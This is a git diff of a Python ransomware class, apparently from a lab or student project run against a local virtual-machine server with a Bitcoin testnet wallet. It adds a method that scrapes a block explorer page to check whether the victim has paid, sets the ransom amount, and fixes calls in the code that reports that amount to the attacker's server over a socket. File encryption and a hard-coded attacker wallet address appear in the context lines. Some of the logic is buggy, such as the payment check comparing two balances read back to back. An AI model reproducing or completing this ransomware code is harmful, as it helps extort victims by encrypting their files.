@@ -10,14 +10,16 @@ import socket
 import math
 import rsa
 import threading
-
+import requests
+import re
 
 class Ransomware: 
     SERVER_IP = "192.168.56.110"
     ENCODING = "utf-8"
     MAX_SIZE = 4096
 
-#     bitcoin_needed = 0.001 * number_of_files + 0.000000000001 * mac_address #TODO: Assign this based on number of files
+    global bitcoin_needed, wallet_address
+    bitcoin_needed = 1; #Instanttiate the amount of bitcoin needed
     wallet_address = 'tb1qud9u85mcjcwndgwjqgcw69neah9z22kp7uw9wv' #address of attackers wallet
 
 
@@ -95,19 +97,34 @@ class Ransomware:
         print(f"[SERVER]: {msg}")
 
 
+    def get_balance(self, wallet_address):
+    
+        # API endpoint URL for retrieving wallet balance from blockchain.com API
+        balance_url = "https://live.blockcypher.com/btc-testnet/address/" + wallet_address
+        decimal_pattern = r'\d+\.\d+'
 
-    #TODO Subin:
+
+        # Make API request to retrieve wallet balance
+        response = requests.get(balance_url)
+
+        response_text = response.text
+        index =  response_text.find("balance of")
+        balance_str = response_text[index+11:index + 20]
+        match = re.search(decimal_pattern, balance_str)
+        balance = float(match.group())
+        return balance
+
+
     def check_if_user_has_paid(self):
-        wallet_address = "tb1qud9u85mcjcwndgwjqgcw69neah9z22kp7uw9wv" #Attackers crypto wallet address
-        initial_balance =  cryptowallet.get_balance(wallet_address)
+        initial_balance =  self.get_balance(wallet_address)
 
-        #TODO: Repolace with actual table
 
-        current_balance = cryptowallet.get_balance(wallet_address)
+        current_balance = self.get_balance(wallet_address)
         change = current_balance - initial_balance
         
         if (change == bitcoin_needed):
             return True
+
 
     # Method that lists all of the non-hidden, non-vital  directories bellow the inserted directory
     def list_safe_directories(self, directory):
@@ -166,7 +183,7 @@ class Ransomware:
             the_file.write(encrypted_contents)
         print("terminated")
 
-    def calculate_and_send_bitcoin_needed(size_of_files):
+    def calculate_and_send_bitcoin_needed(self, size_of_files):
         #subin equation: 
         bitcoin_needed = str(size_of_files/ 10000000)
         self._socket.sendall(base64.b64encode(bitcoin_needed.encode("utf-8")))
@@ -202,7 +219,7 @@ class Ransomware:
         print("Number of files encrypted: " + str(number_of_files))
         print("Total size of files: " + str(size_of_files))
         
-        calculate_and_send_bitcoin_needed(size_of_files)
+        self.calculate_and_send_bitcoin_needed(size_of_files)
 
 
 
